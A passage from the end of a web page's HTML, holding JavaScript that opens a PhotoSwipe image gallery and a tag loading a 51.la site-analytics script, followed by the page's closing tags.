                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script>




<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
  </div>
</body>

</html>